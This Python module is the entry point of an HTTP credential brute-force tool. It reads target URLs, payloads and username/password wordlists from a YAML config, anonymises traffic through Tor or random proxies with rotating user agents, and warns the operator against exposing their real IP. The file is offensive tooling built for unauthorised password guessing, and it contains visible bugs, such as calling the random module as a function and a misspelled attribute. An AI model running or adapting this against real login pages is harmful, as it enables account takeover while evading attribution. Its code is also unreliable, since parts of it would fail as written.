from lib.core.http import Attack as HTTPAttack, MultipleWordlists, test_proxy_connection, Tor
from lib.core import ReadYAMLFile

import aiohttp
import aiofiles as aiof
import asyncio

import logging
import random

log = logging.getLogger(__name__)

class Attack:
    async def run(self, arguments) -> None:
        config = ReadYAMLFile(arguments.config or "configs/attack.yaml")
        if not config:
            log.error(f"Invalid configuration file {arguments.config}")
            return None
        proxy = None
        if not config.body:
            log.error("No body provided.")
            return None
        if not config.connection:
            log.error("No connection settings provided.")
            return None
        if not config.credentials:
            log.error("No credentials provided.")
        if not config.body.url:
            log.error("No URL provided.")
            return None
        if not config.body.method:
            log.error("No method provided.")
            return None
        if not config.body.data:
            log.error("No payload provided.")
            return None
        if not config.credentials.usernames and not config.credentials.passwords:
            log.error("No usernames or passwords provided.")
            return None
        if not config.response:
            log.error("No response provided.")
            return None
        if not config.response.success and not config.response.fail:
            log.error("No success or failure response provided. Provide one of them.")
            return None
        if config.response.success and config.response.fail:
            log.warning("BOLDYou provided both success and failure responses. This may cause issues.")
            await asyncio.sleep(5)

        if arguments.proxy or arguments.proxies or arguments.tor:
            proxy = None
            if arguments.proxy:
                proxy = config.connection.proxy
            if arguments.tor and config.connection.tor:
                t = Tor(config.connection.tor)
                t.connect()
                proxy = config.connection.tor.address
            elif arguments.proxies and config.connection.proxies:
                try:
                    async with aiof.open(config.connection.proxies, "r") as file:
                        proxy = random(await file.readline()).replace("\n", "")
                except FileNotFoundError:
                    log.critical(f"File {config.connection.proxies} not found.")
                    return None

            async with aiohttp.ClientSession() as client:
                log.info("Testing proxy connection...")
                isWorking = await test_proxy_connection(client=client, proxy=proxy)
                if not isWorking:
                    log.warning("Please check your proxy settings.")
                    yn = input("\033[1mDo you want to continue? [\033[32mN\033[0m/\033[31my\033[0m] \033[0m").lower() or "n"
                    if yn != "y":
                        return None
                    proxy = None
                else:
                    if config.connection.tor:
                        log.info(f"BOLDTor connection is working ({proxy})")
                    else:
                        log.info(f"BOLDProxy connection is working: {proxy}")

        else:
            log.warning("No proxy or tor connection provided, using default connection. (\033[31;1mYOUR REAL IP WILL BE EXPOSED\033[0m)")
            yn = input("\033[1mDo you want to continue? [\033[32mN\033[0m/\033[31my\033[0m] \033[0m").lower() or "n"
            if yn != "y":
                return None
            log.warning("Using default connection, which means: \033[31;1m>>>YOUR REAL IP WILL BE EXPOSED<<<.\033[0m")
            log.warning("BOLDGiving you __H5__h seconds to give up, in case you regret it.")
            await asyncio.sleep(5)

        if int(config.connection.limit_connections) > 100:
            log.warning("BOLDYou are using a high number of connections, it may cause issues with the target server and overload your CPU. (max recommended is 100)")
            yn = input("\033[1mDo you want to continue? [N/y] \033[0m") or "n"
            if yn.lower() != "y":
                return None
            

        if isinstance(config.credentials.usernames, list) or isinstance(config.credentials.passwords, list):
            log.info("Using multiple wordlists")
            if isinstance(config.credentials.username, list) and len(config.credentials.usernames) > 2 or isinstance(config.credentials.passwords, list) and len(config.credentials.passwords) > 2:
                log.warning("BOLDYou are using a high number of wordlists, it may overload your CPU. (max recommended is 2)")
                yn = input("\033[1mDo you want to continue? [N/y] \033[0m") or "n"
                if yn.lower() != "y":
                    return None
            bruteforce_with_mutiple_wordlists = MultipleWordlists(
                config,
                arguments.clusters,
                proxy,
                arguments.random_agent,
                arguments.user_agent_list,
                output=arguments.output
            )
            return await bruteforce_with_mutiple_wordlists.start()

        bruteforce = HTTPAttack(
            config, 
            proxy, 
            arguments.random_agent, 
            arguments.user_agent,
            arguments.user_agent_list,
            output=arguments.output
        )
        
        return await bruteforce.attack()